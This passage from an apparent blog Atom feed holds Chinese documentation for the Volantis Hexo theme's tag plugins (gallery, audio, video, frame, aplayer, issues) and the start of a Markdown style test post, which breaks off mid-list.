src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/050.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/050.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/053.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/053.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/055.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/055.jpg" srcset="data:image/png;base64,666"><br><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg" srcset="data:image/png;base64,666"></p>            </div><h3 id="上述示例的源码-13"><a href="#上述示例的源码-13" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><p>一行一个图片</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![<span class="string">图片描述</span>](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p>一行多个图片（不换行）</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![<span class="string">图片描述</span>](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg</span>)</span><br><span class="line">![<span class="string">图片描述</span>](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg</span>)</span><br><span class="line">![<span class="string">图片描述</span>](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p>多行多个图片（每行2～8个图片）</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery stretch, 4 %&#125;</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/landscape/AEB33F9D-7294-4CF1-B8C5-3020748A9D45.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/landscape/10A0FCE5-36A1-4AD0-8CF0-019259A89E03.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/landscape/AEB33F9D-7294-4CF1-B8C5-3020748A9D45.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg)</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/landscape/10A0FCE5-36A1-4AD0-8CF0-019259A89E03.jpeg)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-9"><a href="#可以支持的参数-9" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><h4 id="对齐方向-2"><a href="#对齐方向-2" class="headerlink" title="对齐方向"></a>对齐方向</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left, center, right</span><br></pre></td></tr></table></figure><h4 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stretch</span><br></pre></td></tr></table></figure><h4 id="列数"><a href="#列数" class="headerlink" title="列数"></a>列数</h4><p>逗号后面直接写列数，支持 2 ～ 8 列。设定列列数之后就是「多行多图」布局，此时图片默认左对齐。为了避免图片大小不一，建议搭配 <code>stretch</code> 来时图片放大填充。</p><br><h2 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h2><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>2.4</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-13"><a href="#演示效果-13" class="headerlink" title="演示效果"></a>演示效果</h3><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><h3 id="上述示例的源码-14"><a href="#上述示例的源码-14" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><br><h2 id="video"><a href="#video" class="headerlink" title="video"></a>video</h2><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>2.3</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-14"><a href="#演示效果-14" class="headerlink" title="演示效果"></a>演示效果</h3><p>100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><p>50%宽度</p><div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><p>25%宽度</p><div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><h3 id="上述示例的源码-15"><a href="#上述示例的源码-15" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><p>100%宽度</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>50%宽度</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>25%宽度</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><h3 id="可以支持的参数-10"><a href="#可以支持的参数-10" class="headerlink" title="可以支持的参数"></a>可以支持的参数</h3><h4 id="对齐方向-3"><a href="#对齐方向-3" class="headerlink" title="对齐方向"></a>对齐方向</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left, center, right</span><br></pre></td></tr></table></figure><h4 id="列数-1"><a href="#列数-1" class="headerlink" title="列数"></a>列数</h4><p>逗号后面直接写列数，支持 1 ～ 4 列。</p><br><h2 id="frame"><a href="#frame" class="headerlink" title="frame"></a>frame</h2><p>这是一个能够将图片或者视频套入设备框架中的标签，可以用来更优雅地显示截图、录屏。</p><figure class="highlight md"><figcaption><span>本插件最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% frame 框架名 | img=图片链接 | alt=图片描述（可选） | part=top/bottom（可选） %&#125;</span><br><span class="line">&#123;% frame 框架名 | video=视频链接 | part=top/bottom（可选） %&#125;</span><br></pre></td></tr></table></figure><br><div class="video-wrap"><div class="frame-wrap" id="iphone11"part="top"><video poster="https://gitee.com/xaoxuu/cdn-assets/raw/master/wiki/prohud/toast-loading@2x.jpg" playsinline="" muted="" loop="" autoplay="" preload="metadata"><source src="https://gitee.com/xaoxuu/cdn-assets/raw/master/wiki/prohud/toast-loading@2x.mov" type="video/mp4"></video><div class="frame"></div></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% frame iphone11 | img&#x3D;https:&#x2F;&#x2F;gitee.com&#x2F;xaoxuu&#x2F;cdn-assets&#x2F;raw&#x2F;master&#x2F;wiki&#x2F;prohud&#x2F;toast-loading@2x.jpg | video&#x3D;https:&#x2F;&#x2F;gitee.com&#x2F;xaoxuu&#x2F;cdn-assets&#x2F;raw&#x2F;master&#x2F;wiki&#x2F;prohud&#x2F;toast-loading@2x.mov | part&#x3D;top %&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中同时出现了 <code>img</code> 和 <code>video</code> 那么它就是一个带有封面的视频，在视频加载完成之前会先显示视频封面。</p><h3 id="设备框架"><a href="#设备框架" class="headerlink" title="设备框架"></a>设备框架</h3><p>目前支持的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iphone11</span><br></pre></td></tr></table></figure><p>如果您有以下其它设备框架图(svg)，欢迎 PR 兼容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android, ipad, macbook, watch</span><br></pre></td></tr></table></figure><h3 id="剪裁"><a href="#剪裁" class="headerlink" title="剪裁"></a>剪裁</h3><p>通过设置 <code>part=top</code> 或者 <code>part=bottom</code> 来显示上半部分或者下半部分，否则将显示完整的框架及其中的图片/视频。</p><br><h2 id="aplayer"><a href="#aplayer" class="headerlink" title="aplayer"></a>aplayer</h2><p>主题对 APlayer 插件的样式进行了兼容。安装插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -S hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>使用方法：</p><div class="tag link"><a class="link-card" title="hexo-tag-aplayer" href="https://github.com/MoePlayer/hexo-tag-aplayer"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">hexo-tag-aplayer</p><p class="url">https://github.com/MoePlayer/hexo-tag-aplayer</p></div></a></div><br><h2 id="issues"><a href="#issues" class="headerlink" title="issues"></a>issues</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% issues type | api=url | group=key:value1,value2（可选） %&#125;</span><br></pre></td></tr></table></figure><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>根据需求不同，会将 issues 内容解析成不同的 HTML 标签，目前支持的类型有：</p><ul><li><strong>timeline</strong>: 解析成 timeline 标签，issue 的标题对应 timeline 的时间， issue 的内容对应 timeline 的内容。</li><li><strong>sites</strong>: 解析成 sites 标签，需要有 JSON 代码块：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;screenshot&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;keywords&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3></li></ul><p>传可以调得通的 URL ，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api&#x3D;https:&#x2F;&#x2F;gitee.com&#x2F;api&#x2F;v5&#x2F;repos&#x2F;xaoxuu&#x2F;friends&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100&amp;labels&#x3D;active</span><br><span class="line">api&#x3D;https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;xaoxuu&#x2F;friends&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100&amp;labels&#x3D;active</span><br></pre></td></tr></table></figure><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><p>sites 类型的 issues 默认不分组，如果需要分组，可指定分组依据「key」，和分组白名单「value1」「value2」等，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group&#x3D;version:v4,v3,v2</span><br></pre></td></tr></table></figure><p>这个参数的作用就是，筛选出 JSON 中包含 <code>&quot;version&quot;: &quot;v4&quot;</code> 或者 <code>&quot;version&quot;: &quot;v3&quot;</code> 或者 <code>&quot;version&quot;: &quot;v2&quot;</code> 的数据，并分组显示。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h4 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% issues timeline | api&#x3D;https:&#x2F;&#x2F;gitee.com&#x2F;api&#x2F;v5&#x2F;repos&#x2F;xaoxuu&#x2F;timeline&#x2F;issues?state&#x3D;open&amp;creator&#x3D;xaoxuu&amp;sort&#x3D;created&amp;direction&#x3D;desc&amp;page&#x3D;1&amp;per_page&#x3D;100 %&#125;</span><br></pre></td></tr></table></figure><p>显示效果：</p><div class="issues-api timeline"api="https://gitee.com/api/v5/repos/xaoxuu/timeline/issues?state=open&creator=xaoxuu&sort=created&direction=desc&page=1&per_page=100"></div><p>对应的仓库链接：</p><div class="tag link"><a class="link-card" title="Gitee: xaoxuu/timeline" href="https://gitee.com/xaoxuu/timeline/issues"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">Gitee: xaoxuu/timeline</p><p class="url">https://gitee.com/xaoxuu/timeline/issues</p></div></a></div><h4 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% issues sites | api&#x3D;https:&#x2F;&#x2F;gitee.com&#x2F;api&#x2F;v5&#x2F;repos&#x2F;xaoxuu&#x2F;friends&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100&amp;labels&#x3D;active %&#125;</span><br><span class="line">&#123;% issues sites | api&#x3D;https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;xaoxuu&#x2F;friends&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100&amp;labels&#x3D;active %&#125;</span><br></pre></td></tr></table></figure><p>上例中的 <code>labels=active</code> 参数可以控制默认的 issue 不显示，只有自己审核通过添加了 <code>active</code> 标签之后才会显示。上述示例对应的仓库链接：</p><div class="tag link"><a class="link-card" title="GitHub: xaoxuu/friends" href="https://github.com/xaoxuu/friends/issues"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">GitHub: xaoxuu/friends</p><p class="url">https://github.com/xaoxuu/friends/issues</p></div></a></div><h4 id="分组-1"><a href="#分组-1" class="headerlink" title="分组"></a>分组</h4><p>这是主题官网的「示例博客」页面的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% issues sites | api&#x3D;https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;volantis-x&#x2F;examples&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100 | group&#x3D;version:版本：^4.0,版本：^3.0,版本：^2.0 %&#125;</span><br></pre></td></tr></table></figure><p>上述示例对应的仓库链接：</p><div class="tag link"><a class="link-card" title="GitHub: volantis-x/examples" href="https://github.com/volantis-x/examples/issues"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">GitHub: volantis-x/examples</p><p class="url">https://github.com/volantis-x/examples/issues</p></div></a></div><h2 id="Hexo-通用标签"><a href="#Hexo-通用标签" class="headerlink" title="Hexo 通用标签"></a>Hexo 通用标签</h2><p>在文章中使用 <code>&lt;!-- more --&gt;</code>，那么 <code>&lt;!-- more --&gt;</code> 之前的文字将会被视为摘要。首页中将只出现这部分文字，同时这部分文字也会出现在正文之中。详见 Hexo 官方文档：</p><div class="tag link"><a class="link-card" title="Hexo 官方文档 #标签插件" href="https://hexo.io/zh-cn/docs/tag-plugins"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">Hexo 官方文档 #标签插件</p><p class="url">https://hexo.io/zh-cn/docs/tag-plugins</p></div></a></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;为了兼容老用户，旧的标签插件在重构之前依然沿用旧的格式，即「英文逗号+空格」作为参数分隔符，而部分新增标签插件是「空格+英文竖线+空格」，请注意区分。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们也在探索哪种分隔符既简单又不容易引起冲突，所以可能存在多种格式，具体以对应文档</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Markdown Style test</title>
    <link href="https://canc3s.github.io/2018/01/02/markdown/"/>
    <id>https://canc3s.github.io/2018/01/02/markdown/</id>
    <published>2018-01-02T15:31:06.000Z</published>
    <updated>2021-01-30T16:30:40.999Z</updated>
    
    <content type="html"><![CDATA[<p>This post is originated from <a href="https://gist.github.com/apackeer/4159268">here</a> and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.</p><a id="more"></a><hr><h2 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br><span class="line"></span><br><span class="line">Alternatively, for H1 and H2, an underline-ish style:</span><br><span class="line"></span><br><span class="line">Alt-H1</span><br><span class="line">======</span><br><span class="line"></span><br><span class="line">Alt-H2</span><br><span class="line">------</span><br></pre></td></tr></table></figure><h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="H3"><a href="#H3" class="headerlink" title="H3"></a>H3</h3><h4 id="H4"><a href="#H4" class="headerlink" title="H4"></a>H4</h4><h5 id="H5"><a href="#H5" class="headerlink" title="H5"></a>H5</h5><h6 id="H6"><a href="#H6" class="headerlink" title="H6"></a>H6</h6><p>Alternatively, for H1 and H2, an underline-ish style:</p><h1 id="Alt-H1"><a href="#Alt-H1" class="headerlink" title="Alt-H1"></a>Alt-H1</h1><h2 id="Alt-H2"><a href="#Alt-H2" class="headerlink" title="Alt-H2"></a>Alt-H2</h2><h2 id="Emphasis"><a href="#Emphasis" class="headerlink" title="Emphasis"></a>Emphasis</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Emphasis, aka italics, with <span class="emphasis">*asterisks*</span> or <span class="emphasis">_underscores_</span>.</span><br><span class="line"></span><br><span class="line">Strong emphasis, aka bold, with <span class="strong">**asterisks**</span> or <span class="strong">__underscores__</span>.</span><br><span class="line"></span><br><span class="line">Combined emphasis with <span class="strong">**asterisks and <span class="emphasis">_underscores_</span>**</span>.</span><br><span class="line"></span><br><span class="line">Strikethrough uses two tildes. ~~Scratch this.~~</span><br></pre></td></tr></table></figure><p>Emphasis, aka italics, with <em>asterisks</em> or <em>underscores</em>.</p><p>Strong emphasis, aka bold, with <strong>asterisks</strong> or <strong>underscores</strong>.</p><p>Combined emphasis with <strong>asterisks and <em>underscores</em></strong>.</p><p>Strikethrough uses two tildes. <del>Scratch this.</del></p><h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> First ordered list item</span><br><span class="line"><span class="bullet">2.</span> Another item</span><br><span class="line"><span class="bullet">  *</span> Unordered sub-list.</span><br><span class="line"><span class="bullet">1.</span> Actual numbers don&#x27;t matter, just that it&#x27;s a number</span><br><span class="line"><span class="bullet">  1.</span> Ordered sub-list</span><br><span class="line"><span class="bullet">4.</span> And another item.</span><br><span class="line"></span><br><span class="line">   You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we&#x27;ll use three here to also align the raw Markdown).</span><br><span class="line"></span><br><span class="line">   To have a line break without a paragraph, you will need to use two trailing spaces.  </span><br><span class="line">   Note that this line is separate, but within the same paragraph.  </span><br><span class="line">   (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</span><br><span class="line"></span><br><span class="line"><span class="bullet">*</span> Unordered list can use asterisks</span><br><span class="line"><span class="bullet">-</span> Or minuses</span><br><span class="line"><span class="bullet">+</span> Or pluses</span><br><span class="line"><span class="bullet">-</span> Paragraph In unordered list</span><br><span class="line"></span><br><span class="line">  For example like this.</span><br><span class="line"></span><br><span 